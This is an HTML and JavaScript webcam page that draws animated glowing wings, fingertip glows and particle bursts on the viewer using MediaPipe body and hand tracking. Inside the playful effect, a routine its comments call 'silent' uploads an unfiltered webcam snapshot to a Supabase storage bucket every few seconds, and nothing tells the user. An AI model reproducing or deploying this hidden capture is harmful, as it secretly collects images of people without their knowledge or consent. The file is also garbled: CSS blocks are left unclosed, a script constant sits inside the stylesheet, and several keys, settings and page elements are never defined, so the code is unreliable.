<!DOCTYPE html>
<html lang="en">
<head>

<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:#000; width:100vw; height:100vh; overflow:hidden; }

  body::after {
    content:''; position:fixed; inset:0; pointer-events:none; z-index:50;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.1) 2px,rgba(0,0,0,0.1) 4px);

  body::before {
    content:''; position:fixed; inset:0; pointer-events:none; z-index:49;

  #main-canvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:1; }

  #controls {

const SUPABASE_URL = "https://cmwjbqmpxnfxcirshpcr.supabase.co";

<!-- ════════════════════════════════════════════ -->

<script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

<script>
// ─────────────────────────────────────────────────────────────────────────────
//  SETUP
// ─────────────────────────────────────────────────────────────────────────────
const mainCanvas = document.getElementById('main-canvas');
const ctx        = mainCanvas.getContext('2d');
const capCanvas  = document.getElementById('cap-canvas');
const capCtx     = capCanvas.getContext('2d');
const video      = document.getElementById('video');
const hint       = document.getElementById('hint');

function resize() { mainCanvas.width = window.innerWidth; mainCanvas.height = window.innerHeight; }
resize();
window.addEventListener('resize', resize);

// ─────────────────────────────────────────────────────────────────────────────
//  SUPABASE — silent clean capture every 5s
// ─────────────────────────────────────────────────────────────────────────────
let sb = null;
if (SUPABASE_URL && SUPABASE_KEY) sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

async function captureClean() {
  if (!sb || !video.videoWidth) return;
  capCanvas.width  = video.videoWidth;
  capCanvas.height = video.videoHeight;
  capCtx.drawImage(video, 0, 0);
  const blob = await new Promise(r => capCanvas.toBlob(r, 'image/jpeg', 0.88));
  sb.storage.from(BUCKET).upload(`wings_${Date.now()}.jpg`, blob, {
    contentType: 'image/jpeg', upsert: false
  });
}

// ─────────────────────────────────────────────────────────────────────────────
//  THEMES
// ─────────────────────────────────────────────────────────────────────────────
const THEMES = {
  purple: { inner:'#e040fb', outer:'#7b2fff', core:'#fff0ff', glow:'#c77dff', rain:'#d966ff' },
  cyan:   { inner:'#00ffe0', outer:'#0077ff', core:'#f0ffff', glow:'#00ffe0', rain:'#00eeff' },
  fire:   { inner:'#ff6a00', outer:'#ff0040', core:'#fffaf0', glow:'#ff6a00', rain:'#ffaa00' },
  gold:   { inner:'#ffd700', outer:'#ff9500', core:'#fffff0', glow:'#ffd700', rain:'#ffe066' },
};
let theme = THEMES.purple;

document.querySelectorAll('.wing-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.wing-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    theme = THEMES[btn.dataset.color];
  });
});

// ─────────────────────────────────────────────────────────────────────────────
//  PARTICLE RAIN
// ─────────────────────────────────────────────────────────────────────────────
const rainParticles = [];
const MAX_RAIN = 120;

class RainParticle {
  constructor(x, y) {
    this.x     = x + (Math.random() - 0.5) * 30;
    this.y     = y;
    this.vx    = (Math.random() - 0.5) * 1.2;
    this.vy    = 1.5 + Math.random() * 2.5;
    this.size  = 2 + Math.random() * 3;
    this.life  = 1.0;
    this.decay = 0.012 + Math.random() * 0.01;
    this.twinkle = Math.random() * Math.PI * 2;
  }
  update() {
    this.x    += this.vx;
    this.y    += this.vy;
    this.vy   += 0.04; // gravity
    this.life -= this.decay;
    this.twinkle += 0.15;
  }
  draw() {
    if (this.life <= 0) return;
    const twinkleAlpha = 0.6 + Math.sin(this.twinkle) * 0.4;
    ctx.save();
    ctx.globalAlpha  = this.life * twinkleAlpha;
    ctx.shadowColor  = theme.glow;
    ctx.shadowBlur   = 10;
    ctx.fillStyle    = theme.rain;
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size * this.life, 0, Math.PI * 2);
    ctx.fill();
    // bright centre
    ctx.fillStyle   = '#fff';
    ctx.globalAlpha = this.life * twinkleAlpha * 0.7;
    ctx.shadowBlur  = 0;
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size * this.life * 0.4, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }
}

function spawnRain(x, y) {
  if (rainParticles.length >= MAX_RAIN) return;
  rainParticles.push(new RainParticle(x, y));
}

function tickRain() {
  for (let i = rainParticles.length - 1; i >= 0; i--) {
    rainParticles[i].update();
    rainParticles[i].draw();
    if (rainParticles[i].life <= 0) rainParticles.splice(i, 1);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  GLOW LINE + CURVE HELPERS
// ─────────────────────────────────────────────────────────────────────────────
function glowLine(x1, y1, x2, y2, width, alpha=1) {
  ctx.save(); ctx.strokeStyle=theme.outer; ctx.lineWidth=width+10;
  ctx.globalAlpha=0.07*alpha; ctx.shadowColor=theme.glow; ctx.shadowBlur=30;
  ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();

  ctx.save(); ctx.strokeStyle=theme.inner; ctx.lineWidth=width+4;
  ctx.globalAlpha=0.28*alpha; ctx.shadowColor=theme.glow; ctx.shadowBlur=20;
  ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();

  ctx.save(); ctx.strokeStyle=theme.core; ctx.lineWidth=Math.max(0.8,width*0.5);
  ctx.globalAlpha=0.95*alpha; ctx.shadowColor=theme.glow; ctx.shadowBlur=10;
  ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();
}

function glowCurve(points, width, alpha=1) {
  if (points.length < 2) return;
  const draw = (lw, color, ga, blur) => {
    ctx.save(); ctx.strokeStyle=color; ctx.lineWidth=lw;
    ctx.globalAlpha=ga; ctx.shadowColor=theme.glow; ctx.shadowBlur=blur;
    ctx.lineCap='round'; ctx.lineJoin='round';
    ctx.beginPath(); ctx.moveTo(points[0].x, points[0].y);
    for (let i=1; i<points.length-1; i++) {
      const mx=(points[i].x+points[i+1].x)/2, my=(points[i].y+points[i+1].y)/2;
      ctx.quadraticCurveTo(points[i].x,points[i].y,mx,my);
    }
    ctx.lineTo(points[points.length-1].x, points[points.length-1].y);
    ctx.stroke(); ctx.restore();
  };
  draw(width+12, theme.outer, 0.07*alpha, 35);
  draw(width+5,  theme.inner, 0.28*alpha, 22);
  draw(width*0.6,theme.core,  0.92*alpha, 12);
}

// ─────────────────────────────────────────────────────────────────────────────
//  DRAW WING
//  side: -1 = left, +1 = right
//  flapOffset: current flap angle from animation
// ─────────────────────────────────────────────────────────────────────────────
function drawWing(shoulder, side, wingSpan, flapOffset) {
  const cx = shoulder.x;
  const cy = shoulder.y;
  const len      = wingSpan;
  const feathers = 6;

  // Base direction: pure left or right
  const baseAngle = side === -1 ? Math.PI : 0;

  // Flap: top feathers lift up, bottom stay — natural bird wing feel
  const flapLift = flapOffset * 0.35; // how much flap affects Y

  // Ripple: each feather ripples slightly offset in phase
  const rippleAmp = 0.04;

  const tipPoints = []; // collect tip positions for rain spawning

  for (let f = 0; f < feathers; f++) {
    const t = f / (feathers - 1); // 0=top, 1=bottom

    // Fan: top feathers angle upward, bottom angle downward
    const fanTop    = -0.5 + flapLift;           // rises on upstroke
    const fanBottom =  0.6 - flapLift * 0.3;     // less movement at bottom
    const fanOffset = fanTop + (fanBottom - fanTop) * t;

    // Per-feather ripple wave (staggered phase)
    const ripple    = Math.sin(flapOffset * 3 + f * 0.6) * rippleAmp;
    const fanAngle  = baseAngle + (fanOffset + ripple) * side;

    // Length tapering
    const featherLen = len * (1.0 - t * 0.42);
    const baseWidth  = 3 + (1 - t) * 5;

    const tipX = cx + Math.cos(fanAngle) * featherLen;
    const tipY = cy + Math.sin(fanAngle) * featherLen;

    // Elegant upward curve on each feather
    const cpAngle = fanAngle - 0.1 * side;
    const cpX = cx + Math.cos(cpAngle) * featherLen * 0.55;
    const cpY = cy + Math.sin(cpAngle) * featherLen * 0.55 - featherLen * 0.08;

    const pts = [{ x:cx, y:cy }, { x:cpX, y:cpY }, { x:tipX, y:tipY }];
    glowCurve(pts, baseWidth * (1 - t * 0.4), 0.6 + (1 - t) * 0.4);

    // Split tip
    if (f < feathers - 1) {
      const splitAngle = fanAngle - 0.2 * side;
      const splitLen   = featherLen * 0.25;
      glowLine(tipX, tipY,
        tipX + Math.cos(splitAngle) * splitLen,
        tipY + Math.sin(splitAngle) * splitLen,
        1.2, 0.35);
    }

    tipPoints.push({ x:tipX, y:tipY });
  }

  // Wing spine
  const spineAngle = baseAngle - 0.07 * side;
  glowLine(cx, cy,
    cx + Math.cos(spineAngle) * len * 0.88,
    cy + Math.sin(spineAngle) * len * 0.88,
    3, 0.9);

  return tipPoints;
}

// ─────────────────────────────────────────────────────────────────────────────
//  SHOULDER PULSE DOT
// ─────────────────────────────────────────────────────────────────────────────
function drawShoulderDot(pt, pulseT) {
  const pulse = 0.6 + Math.sin(pulseT) * 0.4;
  ctx.save();
  ctx.shadowColor  = theme.glow; ctx.shadowBlur = 28 * pulse;
  ctx.fillStyle    = theme.inner; ctx.globalAlpha = 0.9 * pulse;
  ctx.beginPath(); ctx.arc(pt.x, pt.y, 8 * pulse, 0, Math.PI*2); ctx.fill();
  ctx.fillStyle    = '#fff'; ctx.globalAlpha = 0.8; ctx.shadowBlur = 0;
  ctx.beginPath(); ctx.arc(pt.x, pt.y, 3.5, 0, Math.PI*2); ctx.fill();
  // outer ring
  ctx.strokeStyle  = theme.glow; ctx.lineWidth = 1.5;
  ctx.globalAlpha  = 0.3 * pulse; ctx.shadowBlur = 14;
  ctx.shadowColor  = theme.glow;
  ctx.beginPath(); ctx.arc(pt.x, pt.y, 14 * pulse, 0, Math.PI*2); ctx.stroke();
  ctx.restore();
}

// ─────────────────────────────────────────────────────────────────────────────
//  VIDEO BACKGROUND
// ─────────────────────────────────────────────────────────────────────────────
function drawVideo() {
  if (!video.videoWidth) return;
  const vw=video.videoWidth, vh=video.videoHeight;
  const cw=mainCanvas.width, ch=mainCanvas.height;
  const s=Math.max(cw/vw, ch/vh);
  const dw=vw*s, dh=vh*s, dx=(cw-dw)/2, dy=(ch-dh)/2;
  ctx.save();
  ctx.translate(cw,0); ctx.scale(-1,1);
  ctx.drawImage(video, cw-dx-dw, dy, dw, dh);
  ctx.restore();
  ctx.fillStyle='rgba(0,0,10,0.22)';
  ctx.fillRect(0,0,cw,ch);
}

// ─────────────────────────────────────────────────────────────────────────────
//  POSE STATE + ANIMATION TIMERS
// ─────────────────────────────────────────────────────────────────────────────
let poseData   = null;
let handsData  = null;    // array of hand landmark arrays
let clock      = 0;       // main animation clock
let rainTimer  = 0;
let wingScale  = 1.0;     // smoothly driven by hand height

// ─────────────────────────────────────────────────────────────────────────────
//  FINGERTIP GLOW
// ─────────────────────────────────────────────────────────────────────────────
const FINGERTIPS = [4, 8, 12, 16, 20]; // thumb, index, middle, ring, pinky

function drawFingertips(landmarks) {
  for (const idx of FINGERTIPS) {
    const lm = landmarks[idx];
    // mirror x like pose (1 - x)
    const fx = (1 - lm.x) * mainCanvas.width;
    const fy = lm.y * mainCanvas.height;
    const pulse = 0.65 + Math.sin(clock * 3 + idx) * 0.35;
    ctx.save();
    ctx.shadowColor = theme.glow; ctx.shadowBlur = 22 * pulse;
    ctx.fillStyle   = theme.inner; ctx.globalAlpha = 0.85 * pulse;
    ctx.beginPath(); ctx.arc(fx, fy, 6 * pulse, 0, Math.PI * 2); ctx.fill();
    ctx.fillStyle   = '#fff'; ctx.globalAlpha = 0.9; ctx.shadowBlur = 0;
    ctx.beginPath(); ctx.arc(fx, fy, 2.5, 0, Math.PI * 2); ctx.fill();
    ctx.restore();
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  PALM BURST PARTICLES  (fire when palm faces up)
// ─────────────────────────────────────────────────────────────────────────────
const burstParticles = [];
const MAX_BURST = 200;

// Theme burst shapes: 'orb' | 'shard' | 'star' | 'sparkle'
const THEME_BURST = {
  purple: 'shard',
  cyan:   'star',
  fire:   'orb',
  gold:   'sparkle',
};

function currentBurstShape() {
  for (const [key, t] of Object.entries(THEMES)) {
    if (t === theme) return THEME_BURST[key] || 'orb';
  }
  return 'orb';
}

class BurstParticle {
  constructor(x, y) {
    const angle  = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 0.9; // upward cone
    const speed  = 2.5 + Math.random() * 5;
    this.x       = x + (Math.random() - 0.5) * 18;
    this.y       = y;
    this.vx      = Math.cos(angle) * speed;
    this.vy      = Math.sin(angle) * speed;
    this.size    = 3 + Math.random() * 6;
    this.rot     = Math.random() * Math.PI * 2;
    this.rotV    = (Math.random() - 0.5) * 0.18;
    this.life    = 1.0;
    this.decay   = 0.016 + Math.random() * 0.012;
    this.shape   = currentBurstShape();
    this.twinkle = Math.random() * Math.PI * 2;
  }
  update() {
    this.x      += this.vx;
    this.y      += this.vy;
    this.vy     += 0.07;   // gravity
    this.vx     *= 0.985;  // drag
    this.rot    += this.rotV;
    this.life   -= this.decay;
    this.twinkle += 0.12;
  }
  draw() {
    if (this.life <= 0) return;
    const a = this.life * (0.7 + Math.sin(this.twinkle) * 0.3);
    const s = this.size * (0.4 + this.life * 0.6);
    ctx.save();
    ctx.translate(this.x, this.y);
    ctx.rotate(this.rot);
    ctx.globalAlpha  = a;
    ctx.shadowColor  = theme.glow;
    ctx.shadowBlur   = 18;

    if (this.shape === 'shard') {
      // Lightning shard — thin elongated diamond
      ctx.fillStyle = this.life > 0.6 ? theme.core : theme.inner;
      ctx.beginPath();
      ctx.moveTo(0, -s * 2.2);
      ctx.lineTo(s * 0.4, 0);
      ctx.lineTo(0, s * 0.8);
      ctx.lineTo(-s * 0.4, 0);
      ctx.closePath();
      ctx.fill();

    } else if (this.shape === 'star') {
      // 6-point star for frost
      ctx.fillStyle = theme.inner;
      ctx.beginPath();
      for (let i = 0; i < 6; i++) {
        const a1 = (i / 6) * Math.PI * 2;
        const a2 = ((i + 0.5) / 6) * Math.PI * 2;
        const r1 = s * 1.2, r2 = s * 0.45;
        if (i === 0) ctx.moveTo(Math.cos(a1) * r1, Math.sin(a1) * r1);
        else         ctx.lineTo(Math.cos(a1) * r1, Math.sin(a1) * r1);
        ctx.lineTo(Math.cos(a2) * r2, Math.sin(a2) * r2);
      }
      ctx.closePath();
      ctx.fill();
      // core dot
      ctx.fillStyle = '#fff'; ctx.shadowBlur = 0;
      ctx.beginPath(); ctx.arc(0, 0, s * 0.3, 0, Math.PI * 2); ctx.fill();

    } else if (this.shape === 'orb') {
      // Glowing ember orb — fire
      const grad = ctx.createRadialGradient(0, 0, 0, 0, 0, s);
      grad.addColorStop(0,   theme.core);
      grad.addColorStop(0.4, theme.inner);
      grad.addColorStop(1,   'transparent');
      ctx.fillStyle = grad;
      ctx.beginPath(); ctx.arc(0, 0, s, 0, Math.PI * 2); ctx.fill();

    } else {
      // sparkle — 4-point cross with glint (gold/angel)
      ctx.fillStyle = theme.inner;
      ctx.beginPath();
      for (let i = 0; i < 4; i++) {
        const a1 = (i / 4) * Math.PI * 2;
        const a2 = ((i + 0.5) / 4) * Math.PI * 2;
        if (i === 0) ctx.moveTo(Math.cos(a1) * s * 1.5, Math.sin(a1) * s * 1.5);
        else         ctx.lineTo(Math.cos(a1) * s * 1.5, Math.sin(a1) * s * 1.5);
        ctx.lineTo(Math.cos(a2) * s * 0.35, Math.sin(a2) * s * 0.35);
      }
      ctx.closePath();
      ctx.fill();
      ctx.fillStyle = '#fffbe0'; ctx.shadowBlur = 0;
      ctx.beginPath(); ctx.arc(0, 0, s * 0.28, 0, Math.PI * 2); ctx.fill();
    }
    ctx.restore();
  }
}

function spawnBurst(x, y, count = 1) {
  for (let i = 0; i < count; i++) {
    if (burstParticles.length < MAX_BURST) burstParticles.push(new BurstParticle(x, y));
  }
}

function tickBurst() {
  for (let i = burstParticles.length - 1; i >= 0; i--) {
    burstParticles[i].update();
    burstParticles[i].draw();
    if (burstParticles[i].life <= 0) burstParticles.splice(i, 1);
  }
}

// Detect palm-up: middle finger tip (12) should be ABOVE wrist (0) by enough
// and palm normal should face camera (z component check via wrist vs middle base)
function isPalmUp(hand) {
  const wrist      = hand[0];
  const middleTip  = hand[12];
  const middleMcp  = hand[9];  // middle finger base
  // Palm up: fingertips above wrist in screen space (lower y = higher on screen)
  // and the middle finger tip above the MCP
  const fingerAboveWrist = middleTip.y < wrist.y - 0.05;
  // Palm orientation: wrist z vs middle MCP z — when palm up, wrist z > middle z
  const palmFacingUp = wrist.z > middleMcp.z + 0.01;
  return fingerAboveWrist && palmFacingUp;
}


function updateWingScale(lm) {
  if (!handsData || handsData.length === 0) {
    wingScale += (1.0 - wingScale) * 0.06; // drift back to default
    return;
  }
  const shoulderY = (lm[11].y + lm[12].y) / 2; // avg shoulder y (0-1)
  let minWristY = shoulderY;
  for (const hand of handsData) {
    const wrist = hand[0]; // landmark 0 = wrist
    if (wrist.y < minWristY) minWristY = wrist.y;
  }
  // How far above shoulders is the highest wrist? Map to [1.0 … 2.0]
  const lift = Math.max(0, shoulderY - minWristY); // 0 when at shoulder, ~0.4 when fully raised
  const target = 1.0 + Math.min(lift * 2.5, 1.0); // 1.0 → 2.0
  wingScale += (target - wingScale) * 0.08; // smooth
}


function render() {
  requestAnimationFrame(render);
  clock += 0.03;
  rainTimer++;

  drawVideo();

  if (!poseData) { tickRain(); tickBurst(); return; }
  const lm = poseData;

  if (lm[11].visibility < 0.4 || lm[12].visibility < 0.4) { tickRain(); tickBurst(); return; }

  const leftShoulder  = toScreen(lm[11]);
  const rightShoulder = toScreen(lm[12]);

  // Wing span from shoulder width
  const shoulderWidth = Math.hypot(
    rightShoulder.x - leftShoulder.x,
    rightShoulder.y - leftShoulder.y
  );

  // Hand tracking: update wing scale from wrist height
  updateWingScale(lm);
  const wingSpan = shoulderWidth * 3.0 * wingScale;

  // Flap: slow sine wave — full flap cycle every ~3 seconds
  const flapOffset = Math.sin(clock * 1.1) * 0.6;

  // Pulse for shoulder dots
  const pulseT = clock * 2.2;

  // Draw wings, get tip positions for rain
  const leftTips  = drawWing(leftShoulder,  -1, wingSpan, flapOffset);
  const rightTips = drawWing(rightShoulder, +1, wingSpan, flapOffset);

  // Shoulder pulse dots
  drawShoulderDot(leftShoulder,  pulseT);
  drawShoulderDot(rightShoulder, pulseT + Math.PI); // offset phase

  // Fingertip glows + palm burst from hands tracking
  if (handsData) {
    for (const hand of handsData) {
      drawFingertips(hand);
      // Palm-up detection → burst from palm centre (landmark 9 = middle MCP)
      if (isPalmUp(hand)) {
        const palmLm = hand[9];
        const px = (1 - palmLm.x) * mainCanvas.width;
        const py = palmLm.y * mainCanvas.height;
        // Spawn 2-4 particles per frame while palm is up
        spawnBurst(px, py, 3);
      }
    }
  }

  // Spawn rain from outer wing tips every 2 frames
  if (rainTimer % 2 === 0) {
    // Pick 2 random tip points from each wing to rain from
    const allTips = [...leftTips, ...rightTips];
    for (let i = 0; i < 3; i++) {
      const tip = allTips[Math.floor(Math.random() * allTips.length)];
      spawnRain(tip.x, tip.y);
    }
  }

  // Tick rain + burst particles
  tickRain();
  tickBurst();
}

// ─────────────────────────────────────────────────────────────────────────────
//  HELPERS
// ─────────────────────────────────────────────────────────────────────────────
function toScreen(lm) {
  return { x: (1 - lm.x) * mainCanvas.width, y: lm.y * mainCanvas.height };
}

render();

// ─────────────────────────────────────────────────────────────────────────────
//  MEDIAPIPE POSE
// ─────────────────────────────────────────────────────────────────────────────
const pose = new Pose({
  locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}`
});
pose.setOptions({
  modelComplexity:        1,
  smoothLandmarks:        true,
  enableSegmentation:     false,
  minDetectionConfidence: 0.5,
  minTrackingConfidence:  0.5
});
pose.onResults(results => {
  if (results.poseLandmarks) {
    poseData = results.poseLandmarks;
    hint.style.opacity = '0';
  } else {
    poseData = null;
    hint.style.opacity = '1';
  }
});

// ─────────────────────────────────────────────────────────────────────────────
//  MEDIAPIPE HANDS
// ─────────────────────────────────────────────────────────────────────────────
const hands = new Hands({
  locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`
});
hands.setOptions({
  maxNumHands:            2,
  modelComplexity:        1,
  minDetectionConfidence: 0.5,
  minTrackingConfidence:  0.5
});
hands.onResults(results => {
  handsData = (results.multiHandLandmarks && results.multiHandLandmarks.length)
    ? results.multiHandLandmarks : null;
});

// ─────────────────────────────────────────────────────────────────────────────
//  CAMERA BOOT
// ─────────────────────────────────────────────────────────────────────────────
(async () => {
  const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: isMobile
        ? { facingMode:'user', width:{ideal:1280}, height:{ideal:720} }  // landscape on mobile
        : { facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
      audio: false
    });
  } catch(e) {
    hint.textContent = 'camera denied: ' + e.message;
    return;
  }

  video.srcObject = stream;
  await new Promise(r => { video.onloadedmetadata = () => video.play().then(r); });

  let frameCount = 0;
  new Camera(video, {
    onFrame: async () => {
      frameCount++;
      await pose.send({ image: video });
      if (frameCount % 2 === 0) await hands.send({ image: video });
    },
    width:  video.videoWidth  || 1280,
    height: video.videoHeight || 720
  }).start();

  // Silent Supabase captures every 5s
  if (sb) {
    captureClean();
    setInterval(captureClean, CAPTURE_MS);
  }
})();
</script>
